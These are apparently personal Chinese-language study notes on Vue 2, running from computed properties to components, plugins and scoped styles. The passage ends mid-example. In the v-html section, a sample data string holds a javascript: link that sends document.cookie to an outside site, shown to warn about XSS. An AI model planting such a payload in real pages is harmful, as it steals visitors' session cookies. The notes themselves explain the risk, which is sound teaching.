# Vue

## 一、初始Vue

### 08.计算属性

![image-20231031012229456](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231031012229456.png)

### 09.监视属性

watch和compute的区别
1.computed能完成的功能,watch都可以完成。
2.watch能完成的功能，computed不一定能完成，例如: watch可以进行异步操作。两个重要的小原则:
1.所被Vue管理的函数，最好写成普通函数 rg:changeWeather(){}，这样this的指向才是vm或组件实例对象。
⒉.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等)，最好写成箭头函数，这样this的指向才是vm或组件实例对象。

watch：缺点：计算麻烦，优点：可以对数据进行异步操作

comput:缺点：不能处理异步操作，return值不能进行异步操作，优点：计算方便

![image-20231106143743031](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106143743031.png)

### 010.绑定class样式

绑定样式:
1.class样式
写法:class="xxx" xxx可以是字符串、对象、数组。
字符串写法适用于:类名不确定，要动态获取。
对象写法适用于:要绑定多个样式，个数不确定，名字也不确定,
数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。
2. style样式
    : style="{fontsize: xxx}"其中xxx是动态值。

  : style="[a,b]"其中a、b是样式对象。

绑定class样式--字符串写法，样式的类型不确定，需要动态决定

![image-20231106150139874](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106150139874.png)

class和:class的区别：与class绑定在一起

绑定class样式--数组写法，样式的个数不确定，名字也不确定

![image-20231106151739674](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106151739674.png)

绑定class样式--对象写法，样式的个数确定，名字也确定，但是要动态确定要不要

![image-20231106151841430](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106151841430.png)

### 011.绑定style样式

#### style对象写法

![image-20231106152843285](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106152843285.png)

#### 数组写法

写法1：

![image-20231106153014836](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106153014836.png)

![image-20231106153035761](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106153035761.png)

写法2：

![image-20231106153134635](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106153134635.png)

![image-20231106153204710](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231106153204710.png)

### 012.条件渲染

#### 12.1 条件渲染指令

- v-if与v-else

- v-show == display

  ```html
  <div id="root2">
  <!--    使用v-show-->
  <!--    <h1 v-show="true">hello:{{name}}</h1>-->
  <!--    <h1 v-show="1 === 3">hello:{{name}}</h1>-->
  
  <!--    使用v-if-->
  <!--    <h1 v-if="true">hello:{{name}}</h1>-->
  <!--    <h1 v-if="1 === 3">hello:{{name}}</h1>-->
      <h2>当前的n值为{{n}}</h2>
      <button @click="n++">点我n+1</button>
  <!--    <div v-show="n === 1">Angular</div>-->
  <!--    <div v-show="n === 2">React</div>-->
  <!--    <div v-show="n === 3">Vuw</div>-->
      <div v-if="n === 1">Angular</div>
      <div v-else-if="n === 2">React</div>
      <div v-else-if="n === 3">Vuw</div>
  
  </div>xxxxxxxxxx <div id="root2"><!--    使用v-show--><!--    <h1 v-show="true">hello:{{name}}</h1>--><!--    <h1 v-show="1 === 3">hello:{{name}}</h1>--><!--    使用v-if--><!--    <h1 v-if="true">hello:{{name}}</h1>--><!--    <h1 v-if="1 === 3">hello:{{name}}</h1>-->    <h2>当前的n值为{{n}}</h2>    <button @click="n++">点我n+1</button><!--    <div v-show="n === 1">Angular</div>--><!--    <div v-show="n === 2">React</div>--><!--    <div v-show="n === 3">Vuw</div>-->    <div v-if="n === 1">Angular</div>    <div v-else-if="n === 2">React</div>    <div v-else-if="n === 3">Vuw</div></div><div id="root">    <h1>Hello.{{name}}</h1></div><div id="root2">    <h1 v-show="true">hello:{{name}}</h1></div>html
  ```

  

#### 12.2 比较v-if与v-show

如果需要频繁v-show较好

当条件不成立时，v-if的所有子节点不会解析（项目中使用）

不能被打断：

```html
    <div v-if="n === 1">Angular</div>
    <div>@</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vuw</div>
    <div v-else>哈哈</div>
```

条件渲染:
1.v-if
写法:
(1).v-if="表达式"
(2).v-else-if="表达式"(3).v-else="表达式"适用于:切换频率较低的场景。
特点:不展示的DOM元素直接被移除。
注意: v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
2.v-show
I
写法:v-show="表达式"
适用于:切换频率较高的场景。
特点:不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
3.备注:使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

### 013_列表渲染

v-for指令:
1.用于展示列表数据
2.语法: v-for="(item，index) in xxx" : key="yyy"
3.可遍历:数组、对象、字符串（用的很少)、指定次数（用的很少)

```html
<div id="root2">
  <h2>测试遍历数组</h2>
  <ul>
<!--    <li v-for="p in persons" :key="p.id">{{p.name}}-{{p.age}}</li>-->
    <li v-for="(p,index) of persons" :key="index">
      {{p.name}}-{{p.age}}
    </li>
  </ul>
  <h2>测试遍历对象</h2>
  <ul>
    <!--    <li v-for="p in persons" :key="p.id">{{p.name}}-{{p.age}}</li>-->
    <li v-for="(a,b) of car">
      {{a}}---{{b}}
    </li>
  </ul>
  <ul>
    <li v-for="(value,k) of car" :key="k">
      {{k}}---{{value}}
    </li>
  </ul>
  <h2>测试遍历字符串</h2>
  <ul>
    <li v-for="(value,k) of str" :key="k">
      {{value}}---{{k}}
    </li>
  </ul>
  <h2>测试遍历指定次数</h2>
  <ul>
    <li v-for="(value,k) of 5" :key="k">
      {{value}}---{{k}}
    </li>
  </ul>
</div>
```

### 013.1 key与value的原理

面试题:react、vue中的key有什么作用?(key的内部原理）
1。虚拟DOM中key的作用:
key是虚拟DON对象的标识，当状态中的数据发生变化时，Vue会根据【新数据】生成【新的虚拟DoOW)随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下:
2.对比规则: I
(1).旧虚拟DOM中找到了与新虚拟DOM相同的key:
o.若虚拟DOM中内容没变,直接使用之前的真实DOM !
@.若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM.
(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
创建新的真实DOM，随后渲染到到页面。
3。用index作为key可能会引发的问题:
1。若对数据进行:逆序添加、逆序删除等破坏顺序操作;
会产生没有必要的真实DOM更新==>界面效果没问题,
但效率低。
2。如果结构中还包含输入类的DOM:
会产生错误DOM更新==>界面有问题。
4。开发中如何选择key? :
1.最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

用index,将新数据添加到前面（栈） 效率低

![image-20231113011054637](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231113011054637.png)

使用p.id 或者不用：key

![image-20231113011439027](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231113011439027.png)

### 013.2 列表过滤

##### watch:

```html
new Vue({
        el: "#root2",
        data:{
            keyWord:'',
            persons:[
                {id: '001',name:'马冬梅',age:'30',sex:"女"},
                {id: '002',name:'周冬雨',age:'22',sex:"女"},
                {id: '003',name:'周杰伦',age:'18',sex:"男"},
                {id: '004',name:'温兆伦',age:'18',sex:"男"},
            ]
        },
        methods:{
            add(){
                const p = {id: '004',name:'赵六',age:'18'}
                // this.persons.unshift(p)
                this.persons.push(p)
            }
        },
        // 进行监听
        watch:{
            keyWord(val){
                // alert('keyWord被修改了'+val)
                // 或产生bug 下一个数组就会变成新数组导致原有的数组被丢弃
                this.persons = this.persons.filter((p)=>{
                    // return p.age > 18
                    return p.name.indexOf(val) !== -1 //return一个新数组
                })
            }
        }
    })
```

bug：解决办法

定义一个型数组存放数据：

```html
new Vue({
        el: "#root2",
        data:{
            keyWord:'',
            persons:[
                {id: '001',name:'马冬梅',age:'30',sex:"女"},
                {id: '002',name:'周冬雨',age:'22',sex:"女"},
                {id: '003',name:'周杰伦',age:'18',sex:"男"},
                {id: '004',name:'温兆伦',age:'18',sex:"男"},
            ],
            filterPersons:[],
        },
        methods:{
            add(){
                const p = {id: '004',name:'赵六',age:'18'}
                // this.persons.unshift(p)
                this.persons.push(p)
            }
        },
        // 进行监听
        watch:{
            keyWord(val){
                // alert('keyWord被修改了'+val)
                // 或产生bug 下一个数组就会变成新数组，导致原有的数组被丢弃
                this.filterPersons = this.persons.filter((p)=>{
                    // return p.age > 18
                    return p.name.indexOf(val) !== -1 //return一个新数组
                })
            }
        }
    })
```

在现有的列表当中进行查找

```ht
      watch:{
            keyWord:{
                immediate: true,
                handler(val) {
                    this.filterPersons = this.persons.filter((p) =>{
                        return p.name.indexOf(val) !== -1
                    })
                }
            }
        },
```

##### compute:

```html
 const vm = new Vue({
        el: "#root2",
        data:{
            keyWord:'',
            persons:[
                {id: '001',name:'马冬梅',age:'30',sex:"女"},
                {id: '002',name:'周冬雨',age:'22',sex:"女"},
                {id: '003',name:'周杰伦',age:'18',sex:"男"},
                {id: '004',name:'温兆伦',age:'18',sex:"男"},
            ]
        },
        computed:{
            // 会生成一个新数组
            filterPersons(){
                return this.persons.filter((p)=>{
                    // 函数体
                    return p.name.indexOf(this.keyWord) !== -1;
                })
            }
        },
        methods:{
            add(){
                const p = {id: '004',name:'赵六',age:'18'}
                // this.persons.unshift(p)
                this.persons.push(p)
            }
        },
    })
```

### 013.2 列表排序

![image-20231113231959312](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231113231959312.png)

```HT
const vm = new Vue({
        el: "#root2",
        data:{
            keyWord:'',
            persons:[
                {id: '001',name:'马冬梅',age:'30',sex:"女"},
                {id: '002',name:'周冬雨',age:'22',sex:"女"},
                {id: '003',name:'周杰伦',age:'18',sex:"男"},
                {id: '004',name:'温兆伦',age:'55',sex:"男"},
            ],
            sortType:0, // 0原顺序，1降序，2升序 @click=
        },
        computed:{
            // 会生成一个新数组
            filterPersons(){
                const arr = this.persons.filter((p)=>{
                    // 函数体
                    return p.name.indexOf(this.keyWord) !== -1;
                })
                // 判断一下是否需要排序
                if (this.sortType){
                    arr.sort((a,b)=>{
                        return this.sortType === 1 ? a.age-b.age : b.age-a.age
                    })
                }
                return arr
            },
        },
        methods:{
            add(){
                const p = {id: '004',name:'赵六',age:'18'}
                // this.persons.unshift(p)
                this.persons.push(p)
            }
        },
    })
```

### 014.Vue检测数据改变的原理

data:{

​	name:'zjy',

}

{{name}} 这个是vue自己判断数据修改

watch是给程序员用的

和_date一样

![image-20231114002009460](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231114002009460.png)

#### 总结：setter 

1. vue会监视data中所有层次的数据。
2。如何监测对象中的数据?
通过setter实现监视,且要在new Vue时就传入要监测的数据。(1).对象中后追加的属性，Vue默认不做响应式处理
(2).如需给后添加的属性做响应式，请使用如下API:（_data中有getter和setter）
Vue.set(target. propertyName/index,value)或vm.$set(target，propertyName/index，value)
3。如何监测数组中的数据?
通过包裹数组更新元素的方法实现,本质就是做了两件事:(1).调用原生对应的方法对数组进行更新。
(2).重新解析模板，进而更新页面。
4.在Vue修改数组中的某个元素一定要用如下方法:
1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()（修改原有数组）
2. 2.Vue.set()或vm.$set()
    特别注意:Vue.set()和vm.$set()不能给vm或vm的根数据对象添加属性!!!

### 015.手机表单数据

总结：

收集表单数据：

若：<input type="text"/>，则v-model收集的是value值，用户输入的内容就是value值
若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value属性
若：<input type="checkbox"/>
没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）
配置了value属性：
v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
v-model的初始值是数组，那么收集的就是value组成的数组
v-model的三个修饰符：

lazy：失去焦点后再收集数据
number：输入字符串转为有效的数字
trim：输入首尾空格过滤

### 016.过滤器

总结：

过滤器：

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

语法：

注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}

使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"

备注：

过滤器可以接收额外参数，多个过滤器也可以串联
并没有改变原本的数据，而是产生新的对应的数据
————————————————

### 017_指令

#### 017.1 text

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false 
		
		new Vue({
			el:'#root',
			data:{
				name:'JOJO',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>

```



效果：

![img](https://img-blog.csdnimg.cn/img_convert/739ed5a4c0c853f138776edb8273dcb1.png)

总结：

之前学过的指令：

v-bind：单向绑定解析表达式，可简写为:
v-model：双向数据绑定
v-for：遍历数组 / 对象 / 字符串
v-on：绑定事件监听，可简写为@
v-if：条件渲染（动态控制节点是否存存在）
v-else：条件渲染（动态控制节点是否存存在）
v-show：条件渲染 (动态控制节点是否展示)
v-text指令：

作用：向其所在的节点中渲染文本内容

与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
————————————————

#### 017.2 html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<div>Hello，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'JOJO',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>

```

总结：

v-html指令：

作用：向指定节点中渲染包含html结构的内容

与插值语法的区别：

v-html会替换掉节点中所有的内容，{{xx}}则不会
v-html可以识别html结构
严重注意：v-html有安全性问题！！！

在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！

跨站脚本攻击（XSS）是一种在网页中注入恶意脚本的攻击方式，目的是在不知情的用户的浏览器中执行这些脚本。这种攻击通常通过注入恶意的HTML、JavaScript代码到网页中来实现，尤其是在网站未能正确地对用户输入的数据进行过滤或转义时

#### 017.3 cloak

node server

**总结：**

`v-cloak`指令（没有值）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
2. 使用css配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题

#### 017.4 once

**总结：**

`v-once`指令：

1. `v-once`所在节点在初次动态渲染后，就视为静态内容了

2. 以后数据的改变不会引起`v-once`所在结构的更新，可以用于优化性能

   

#### 017.5 pre

**总结：**

`v-pre`指令：

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

#### 017.6 自定义组件

总结：

自定义指令定义语法：

```html
new Vue({															
 	directives:{指令名:配置对象}   
 }) 		
```

局部指令：

```html
 new Vue({															
 	directives:{指令名:回调函数}   
 }) 	
```



全局指令：

Vue.directive(指令名,配置对象)
Vue.directive(指令名,回调函数)
例如：

Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value = binding.value
	},
    //指令所在元素被插入页面时
    inserted(element,binding){
    	element.focus()
    },
    //指令所在的模板被重新解析时
    update(element,binding){
    	element.value = binding.value
    }
})
————————————————

需求1:定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2:定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。自定义指令总结:
一、定义语法:
(1).局部指令:
new Vue({
new Vue({
directives:{指令名:配置对象}或
directives{指令名:回调函数}
})
})i
(2).全局指令:
Vue.directive(指令名,配置对象）或 Vue.directive(指令名,回调函数)
二、配置对象中常用的3个回调:
(1).bind:指令与元素成功绑定时调用。
(2).inserted:指令所在元素被插入页面时调用。(3).update:指令所在模板结构被重新解析时调用。
三、备注:
1.指令定义时不加v-，但使用时要加v-;
2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

### 018 .Vue生命周期

#### 018.1 mounted

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>引出生命周期</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h2 v-if="a">你好啊</h2>
    <h2 :style="{opacity}">欢迎学习Vue</h2>
</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            a:false,
            opacity:1
        },
        // Vue 完成模板解析并把真实DOM元素放入页面后（挂载完毕）调用mounted
        mounted(){
            console.log('mounted',this)
            setInterval(() => {
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
    })
</script>
</html>

```

生命周期：

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的this指向是vm 或 组件实例对象

#### 018.2 分析生命周期

![img](https://img-blog.csdnimg.cn/img_convert/934db3f17c6daded6578bdf1a769d9dc.png)

销毁

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false 

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})
	</script>
</html>

```



#### 018.3 总结

总结：

常用的生命周期钩子：

mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作

beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等收尾工作

关于销毁Vue实例：

销毁后借助Vue开发者工具看不到任何信息

销毁后自定义事件会失效，但原生DOM事件依然有效

一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了

## 二、组件

模块
1.理解:向外提供特定功能的js程序，一般就是一个js文件e
2为什么: js文件很多很复杂
3.作用:复用js，简化js的编写，提高js运行效率
.组件
1.理解:用来实现局部(特定)功能效果的代码集合(html/css/js/image....)e
2．为什公一个界面的功能很复杂·
3.作用:复用编码，简化项目编码，提高运行效率

模块：

![img](https://img-blog.csdnimg.cn/img_convert/e660ab7de59f8164756f3495362857ff.png)

组件方式

![img](https://img-blog.csdnimg.cn/img_convert/0e586dc1d0b8c9c693cc59ad0bacf014.png)

简单展示：

```html
<template>
  <div>
    <my-component title="Hello" content="World"></my-component>
  </div>
</template>

<script>
import MyComponent from './MyComponent.vue'

export default {
  components: {
    MyComponent
  }
}
</script>
```

### 02.1 非单文件组件

一个文件中包含n个组件

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
            //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			}
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'JOJO',
					age:20
				}
			}
		})
		
		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好，JOJO！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})
	</script>
</html>

```

注意：

总结：

关于组件名：

一个单词组成：

第一种写法（首字母小写）：school
第二种写法（首字母大写）：School
多个单词组成：

第一种写法（kebab-case命名）：my-school
第二种写法（CamelCase命名）：MySchool （需要Vue脚手架支持）
备注：

组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行
可以使用name配置项指定组件在开发者工具中呈现的名字
关于组件标签：

第一种写法：<school></school>
第二种写法：<school/>
备注：不使用脚手架时，<school/>会导致后续组件不能渲染
一个简写方式：const school = Vue.extend(options)可简写为：const school = options

### 021.2 组件嵌套

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>基本使用</title>
    <script type="text/javascript" src="../../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>{{msg}}</h1>
</div>
<div id="root2">

</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false

    //第一步：创建school组件
    const school = Vue.extend({
        //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
        template:`
          <div class="demo">
            <h2>学校名称：{{schoolName}}</h2>
            <h2>学校地址：{{address}}</h2>
          </div>
        `,
        data(){
            return {
                schoolName:'尚硅谷',
                address:'北京昌平'
            }
        }
    })

    //第一步：创建student组件
    const student = Vue.extend({
        template:`
             <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
             </div>
          `,
        data(){
            return {
                studentName:'JOJO',
                age:20
            }
        }
    })

    const hello = Vue.extend({
        template:`
             <div>
                <h2>{{helloName}}</h2>
             </div>
          `,
        data(){
            return {
                helloName: "hey"
            }
        }
    })

    const app = Vue.extend({
        template:`
             <div>
                 <school></school>
                    <hr>
                    <!-- 第三步：编写组件标签 -->
                    <student></student>
                    <hello></hello>
             </div>
          `,
        components:{
            school,
            hello,
            student
        }
    })

    //创建vm
    new Vue({
        el:'#root',
        data:{
            msg:'你好，JOJO！'
        },
        //第二步：注册组件（局部注册）
        components:{
            school,
            student
        }
    })

    // 全局注册组件
    Vue.component('hello',hello)

    new Vue({
        template:`
             <app></app>
          `,
        el: "#root2",
        components: {
            app
        }
    })
</script>
</html>
```

### 021.3 VueCompoent

关于VueComponent：

school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的

我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)

特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！

关于this指向：

组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是VueComponent实例对象
new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是Vue实例对象
VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）

Vue的实例对象，以后简称vm

只有在本笔记中VueComponent的实例对象才简称为vc

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>一个重要的内置关系</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		Vue.prototype.x = 99

		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showX">点我输出x</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showX(){
					console.log(this.x)
				}
			},
		})

		const vm = new Vue({
			el:'#root',
			data:{
				msg:'你好'
			},
			components:{school}
		})
	</script>
</html>

```

### 021.4   vc与vm的关系

![image-20210730113353890](https://img-blog.csdnimg.cn/img_convert/8d8b0e2d24b9fd26ff33a600fe0afd7d.png)

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue 原型上的属性、方法

### 022 .1单文件组件

组件关系

![image-20231127011930123](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231127011930123.png)

需要安装脚手架

![image-20231127011920918](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231127011920918.png)

### 022.2 render函数

![image-20231127135341603](C:\Users\34975\AppData\Roaming\Typora\typora-user-images\image-20231127135341603.png)

总结：

关于不同版本的函数：

vue.js 与 vue.runtime.xxx.js的区别：

vue.js 是完整版的 Vue，包含：核心功能+模板解析器
vue.runtime.xxx.js 是运行版的 Vue，只包含核心功能，没有模板解析器
因为 vue.runtime.xxx.js 没有模板解析器，所以不能使用 template 配置项，需要使用 render函数接收到的createElement 函数去指定具体内容

### 022.3  ref

```vue
<template>
  <div>
    <h1 ref="title">{{msg}}</h1>
    <SchoolComponent ref="sch"/>
    <button @click="show" ref="btn">点我输出ref</button>
  </div>
</template>

<script>

import SchoolComponent from "@/components/SchoolComponent.vue";

export default {
  name: 'app',
  components: {SchoolComponent},
  data() {
    return {
      msg: '欢迎学习Vue！'
    }
  },
  methods: {
    show() {
      console.log(this.$refs.title)
      console.log(this.$refs.sch)
      console.log(this.$refs.btn)
    }
  }
}
</script>

<style>
</style>
```



总结：

ref属性：

被用来给元素或子组件注册引用信息（id的替代者）
应用在html标签上获取的是真实DOM元素，应用在组件标签上获取的是组件实例对象（vc）
使用方式：
打标识：<h1 ref="xxx"></h1> 或 <School ref="xxx"></School>
获取：this.$refs.xxx

### 022.4 props

总结：

props配置项：

功能：让组件接收外部传过来的数据

传递数据：<Demo name="xxx"/>

接收数据：

第一种方式（只接收）：props:['name']

第二种方式（限制数据类型）：props:{name:String}

第三种方式（限制类型、限制必要性、指定默认值）：
App:

```vue
<template>
  <div>
    <h1>{{msg}}</h1>
    <SchoolComponent ref="sch"/>
    <StudentComponent name="李四" sex="男" :age="19"/>
    <StudentComponent name="王五" sex="男" :age="19"/>
    <StudentComponent name="张三" sex="男" :age="19+1"/>
  </div>
</template>
```

Student(对类型进行限制):

```vue
 export default {
  name:'StudentComponent',
  data(){
    return {
      // 不使用props
      // name : '周俊颖',
      // sex: '男'
    }
  },
  props:{
    name: {
      type:String, //类型
      required:true, //必要性
      default:'周俊颖' //默认值
    },
    sex: {
      type:String, //类型
      required:true, //必要性
    },
    age: {
      type: Number,
      required:true
    }
  }

}
</script>
```

### 022.5 mixin 混入

**总结：**

`mixin`（混入）：

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   1. 定义混入：

      ```js
      const mixin = {
          data(){....},
          methods:{....}
          ....
      }
      ```

      2.使用混入：

      1. 全局混入：`Vue.mixin(xxx)`
      2. 局部混入：`mixins:['xxx']`

备注：

1. 组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”，在发生冲突时以组件优先。
2. 同名生命周期钩子将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。

### 022.6 plugin

src/plugin.js

```js
export default {
	install(Vue,x,y,z){
		console.log(x,y,z)
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})

		//定义混入
		Vue.mixin({
			data() {
				return {
					x:100,
					y:200
				}
			},
		})

		//给Vue原型上添加一个方法（vm和vc就都能用了）
		Vue.prototype.hello = ()=>{alert('你好啊')}
	}
}

```

src/main.js =============================== Vue.use(plugin,1,2,3) 触发插件

```js
import Vue from 'vue'
import App from './App.vue'
import plugin from './plugin'

Vue.config.productionTip = false
Vue.use(plugin,1,2,3)

new Vue({
    el:"#app",
    render: h => h(App)
})

```

School.vue

```vue
<template>
    <div>
        <h2>学校姓名：{{name | mySlice}}</h2>
        <h2>学校地址：{{address}}</h2>   
    </div>
</template>

<script>
    export default {
        name:'School',
        data() {
            return {
                name:'尚硅谷atguigu',
				address:'北京'
            }
        }
    }
</script>

```

Student.vue

```vue
<template>
    <div>
        <h2>学生姓名：{{name}}</h2>
        <h2>学生性别：{{sex}}</h2> 
        <button @click="test">点我测试hello方法</button>  
    </div>
</template>

<script>
    export default {
        name:'Student',
        data() {
            return {
                name:'JOJO',
				sex:'男'
            }
        },
        methods:{
            test() {
                this.hello()
            }
        }
    }
</script>

```

**总结：**

插件：

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据

3. 定义插件：

4. ```js
   plugin.install = function (Vue, options) {
           // 1. 添加全局过滤器
           Vue.filter(....)
       
           // 2. 添加全局指令
           Vue.directive(....)
       
           // 3. 配置全局混入
           Vue.mixin(....)
       
           // 4. 添加实例方法
           Vue.prototype.$myMethod = function () {...}
           Vue.prototype.$myProperty = xxxx
       }
   
   ```

5. 

6. 使用插件：`Vue.use(plugin)

### 022.7 scoped

School.vue

```vue
<template>
    <div class="demo">
        <h2>学校姓名：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>   
    </div>
</template>

<script>
    export default {
        name:'School',
        data() {
            return {
                name:'尚硅谷',
				address:'北京'
            }
        }
    }
</script>

<style scoped>
    .demo{
        background-color: blueviolet;
    }
</style>
```

App.vue

```vue
<template>
    <div>
        <School/>
        <Student/>
